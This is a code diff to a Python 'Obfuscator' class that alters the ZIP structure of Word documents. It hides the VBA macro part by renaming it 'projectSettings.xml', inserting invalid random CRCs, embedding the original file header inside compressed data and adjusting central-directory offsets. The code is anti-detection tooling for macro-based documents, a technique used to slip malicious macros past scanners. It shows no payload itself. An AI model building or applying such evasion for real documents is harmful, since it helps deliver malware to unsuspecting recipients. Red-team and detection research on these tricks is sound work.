@@ -76,7 +76,6 @@ class Obfuscator:
         filename = self.filename
         offsets = []
 
-        metadata_len = 30
         z = zipfile.ZipFile(filename, "r")
         for filename in z.namelist():
             zi = z.getinfo(filename)
@@ -112,11 +111,14 @@ class Obfuscator:
         metadata = self.metadata
         rawbytes = self.rawbytes
 
-        macro_ind = [i for i, j in enumerate(metadata['CDFH_offsets']) if j[1] == 'word/vbaProject.bin'][0]
+        # find the macro's Local File Header - this offset will be replaced with a dummy Local File Header, and
+        # the original macro's LFH will be embedded within the compressed data section
+        macro_ind = [i for i, j in enumerate(metadata['LFH_offsets']) if j[1] == 'word/vbaProject.bin'][0]
         macro_LFH_offset = metadata['LFH_offsets'][macro_ind][0]
         compressed_size = metadata['LFH_offsets'][macro_ind][2]
+        LFH_CRC_offset = 14
         new_outbytes = bytearray(
-            rawbytes[:macro_LFH_offset + 14])  # Get current buffer up to the CRC spot for the macro
+            rawbytes[:macro_LFH_offset + LFH_CRC_offset])  # Get current buffer up to the CRC spot for the macro
         # add random CRC - 4 random bytes
         random_CRC = randrange(4294967295)  # random from 0 to max int that fits in 4 bytes
         new_outbytes.extend(random_CRC.to_bytes(4, 'little'))
@@ -124,12 +126,13 @@ class Obfuscator:
         new_size = compressed_size + total_Bs
         new_outbytes.extend(new_size.to_bytes(4, 'little'))
         lfh_filename_offset = 30
-        new_outbytes.extend(bytearray(rawbytes[macro_LFH_offset + 22:macro_LFH_offset + lfh_filename_offset]))
+        new_outbytes.extend(bytearray(rawbytes[macro_LFH_offset + LFH_CRC_offset + 8:macro_LFH_offset + lfh_filename_offset]))
 
         # change filename to something random (same length so we don't have to change File name length)
         new_name = 'projectSettings.xml'
         new_outbytes.extend(bytearray(new_name.encode()))
         next_LFH_offset = metadata['LFH_offsets'][macro_ind + 1][0]
+        # check if there was any "extra" section for this LFH
         if next_LFH_offset != (macro_LFH_offset + lfh_filename_offset + len(new_name) + compressed_size):
             print(next_LFH_offset)
             print(macro_LFH_offset + lfh_filename_offset + len(new_name) + compressed_size)
@@ -159,9 +162,8 @@ class Obfuscator:
             bytearray(rawbytes[macro_CDFH_offset + cdfh_crc_offset + 8:macro_CDFH_offset + cdfh_filename_offset]))
         new_outbytes.extend(bytearray(new_name.encode()))
 
-        # curr_index = macro_CDFH_offset+cdfh_filename_offset+len(new_name)
-        cdfh_pointer_to_LFH_offset = 42
         # now every pointer to LFH for all other files AFTER the original macro's CDFH needs to be offset by the # of Bs we added
+        cdfh_pointer_to_LFH_offset = 42
         for i in range(macro_ind + 1, len(metadata['CDFH_offsets'])):
             cdfh_offset = metadata['CDFH_offsets'][i][0]
             new_outbytes.extend(bytearray(rawbytes[cdfh_offset:cdfh_offset + cdfh_pointer_to_LFH_offset]))
@@ -228,7 +230,7 @@ class Obfuscator:
         rawbytes = self.rawbytes
         metadata = self.metadata
 
-        macro_ind = [i for i, j in enumerate(metadata['CDFH_offsets']) if j[1] == 'word/vbaProject.bin'][0]
+        macro_ind = [i for i, j in enumerate(metadata['LFH_offsets']) if j[1] == 'word/vbaProject.bin'][0]
         macro_LFH_offset = metadata['LFH_offsets'][macro_ind][0]
 
         # add invalid CRC in the LFH - 4 random bytes
